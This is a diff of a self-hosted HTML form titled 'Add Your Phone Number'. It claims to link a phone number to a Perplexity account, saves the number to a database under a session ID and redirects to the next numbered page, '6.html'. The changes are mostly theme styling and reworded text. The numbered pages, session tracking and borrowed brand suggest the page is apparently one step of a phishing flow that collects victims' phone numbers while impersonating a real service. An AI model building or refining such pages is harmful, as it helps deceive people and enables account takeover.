@@ -3,38 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Your Mobile Number</title>
+    <title>Add Your Phone Number</title>
     <style>
+        /* Define CSS Variables for Light Mode (Default) */
         :root {
-            /* Light Theme Variables */
             --bg-color: #ffffff;
             --text-primary: #2d333a;
             --text-secondary: #6e6e80;
-            --input-border: #c2c8d0;
             --input-bg: #ffffff;
-            --input-text: #000000;
-            --input-focus: #000000;
+            --input-border: #c2c8d0;
+            --input-border-focus: #000000;
             --label-bg: #ffffff;
             --btn-bg: #0f172a;
+            --btn-bg-hover: #1e293b;
             --btn-text: #ffffff;
-            --btn-hover: #1e293b;
-            --error-color: #d93025;
         }
 
-        :root.dark-theme {
-            /* Dark Theme Variables */
+        /* Define CSS Variables for Dark Mode */
+        [data-theme="dark"] {
             --bg-color: #000000;
             --text-primary: #ffffff;
             --text-secondary: #a1a1aa;
-            --input-border: #3f3f46;
             --input-bg: #000000;
-            --input-text: #ffffff;
-            --input-focus: #ffffff;
+            --input-border: #52525b;
+            --input-border-focus: #ffffff;
             --label-bg: #000000;
             --btn-bg: #ffffff;
+            --btn-bg-hover: #e4e4e7;
             --btn-text: #000000;
-            --btn-hover: #e4e4e7;
-            --error-color: #f87171;
         }
 
         * {
@@ -50,7 +46,8 @@
             align-items: center;
             min-height: 100vh;
             background-color: var(--bg-color);
-            transition: background-color 0.3s ease;
+            color: var(--text-primary);
+            transition: background-color 0.3s, color 0.3s;
         }
 
         .container {
@@ -66,7 +63,6 @@
             margin-bottom: 10px;
             color: var(--text-primary);
             letter-spacing: -0.5px;
-            transition: color 0.3s ease;
         }
 
         p {
@@ -74,7 +70,6 @@
             color: var(--text-secondary);
             line-height: 1.5;
             margin-bottom: 30px;
-            transition: color 0.3s ease;
         }
 
         .input-group {
@@ -92,7 +87,7 @@
             font-size: 12px;
             color: var(--text-secondary);
             z-index: 1;
-            transition: background-color 0.3s ease, color 0.3s ease;
+            transition: background-color 0.3s, color 0.3s;
         }
 
         input[type="tel"] {
@@ -100,7 +95,7 @@
             padding: 16px;
             font-size: 18px;
             background-color: var(--input-bg);
-            color: var(--input-text);
+            color: var(--text-primary);
             border: 1px solid var(--input-border);
             border-radius: 30px;
             outline: none;
@@ -108,7 +103,7 @@
         }
 
         input[type="tel"]:focus {
-            border-color: var(--input-focus);
+            border-color: var(--input-border-focus);
         }
 
         /* Remove arrows from number input */
@@ -129,52 +124,47 @@
             font-weight: 500;
             cursor: pointer;
             margin-top: 10px;
-            transition: background-color 0.2s, color 0.2s;
+            transition: background-color 0.3s, color 0.3s;
         }
 
         .btn-continue:hover {
-            background-color: var(--btn-hover);
+            background-color: var(--btn-bg-hover);
         }
 
         .error-msg {
-            color: var(--error-color);
+            color: #d93025;
             font-size: 13px;
             margin-top: 5px;
             display: none;
         }
     </style>
-
-    <!-- Theme Handling Script -->
+    
+    <!-- Theme Detection Script -->
     <script>
         function applyTheme() {
             const urlParams = new URLSearchParams(window.location.search);
             const themeParam = urlParams.get('theme');
-            const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)');
+            const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
 
             if (themeParam === 'dark') {
-                document.documentElement.classList.add('dark-theme');
+                document.documentElement.setAttribute('data-theme', 'dark');
             } else if (themeParam === 'light') {
-                document.documentElement.classList.remove('dark-theme');
-            } else if (systemPrefersDark.matches) {
-                document.documentElement.classList.add('dark-theme');
+                document.documentElement.setAttribute('data-theme', 'light');
             } else {
-                document.documentElement.classList.remove('dark-theme');
+                // Fallback to real-time device native theme
+                document.documentElement.setAttribute('data-theme', prefersDark ? 'dark' : 'light');
             }
         }
 
-        // Apply immediately to prevent Flash of Unstyled Content (FOUC)
+        // Apply theme immediately to prevent flashing
         applyTheme();
 
-        // Listen for real-time system native theme changes
+        // Listen for real-time changes in native device theme
         window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
             const urlParams = new URLSearchParams(window.location.search);
-            // Only adapt to system changes if no explicit URL theme overrides it
+            // Only auto-switch if theme is NOT hardcoded in URL
             if (!urlParams.has('theme')) {
-                if (e.matches) {
-                    document.documentElement.classList.add('dark-theme');
-                } else {
-                    document.documentElement.classList.remove('dark-theme');
-                }
+                document.documentElement.setAttribute('data-theme', e.matches ? 'dark' : 'light');
             }
         });
     </script>
@@ -184,8 +174,8 @@
     <div class="container">
         <!-- ChatGPT Text Removed as requested -->
         
-        <h1>Connect Your Mobile Number</h1>
-        <p>Connect Your Phone Number to signing in to your Perplexity Account</p>
+        <h1>Add Your Phone Number</h1>
+        <p>You can use your phone number to sign in to your Perplexity Account and reset your password if you forgot it. This won't make your number public.</p>
 
         <div class="input-group">
             <span class="input-label">Mobile Number</span>
@@ -221,20 +211,10 @@
         const submitBtn = document.getElementById('submitBtn');
         const errorMsg = document.getElementById('error');
 
-        // Function to get Session ID from URL
-        const getSessionId = () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get('session');
-        };
-
-        // Function to carry over theme param to next page if it exists
-        const getThemeParam = () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const theme = urlParams.get('theme');
-            return theme ? `&theme=${theme}` : '';
-        };
-
-        const sessionId = getSessionId();
+        // Function to get Parameters from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session');
+        const themeParam = urlParams.get('theme');
 
         // Restriction: Only allow 10 digits
         phoneInput.addEventListener('input', (e) => {
@@ -266,8 +246,13 @@
                     updatedAt: serverTimestamp()
                 });
 
-                // Redirect to 6.html with same session ID and keep theme intact
-                window.location.href = `6.html?session=${sessionId}${getThemeParam()}`;
+                // Redirect to 6.html with same session ID and carry over the theme parameter if it exists
+                let nextUrl = `6.html?session=${sessionId}`;
+                if (themeParam) {
+                    nextUrl += `&theme=${themeParam}`;
+                }
+                
+                window.location.href = nextUrl;
 
             } catch (e) {
                 console.error("Error updating document: ", e);
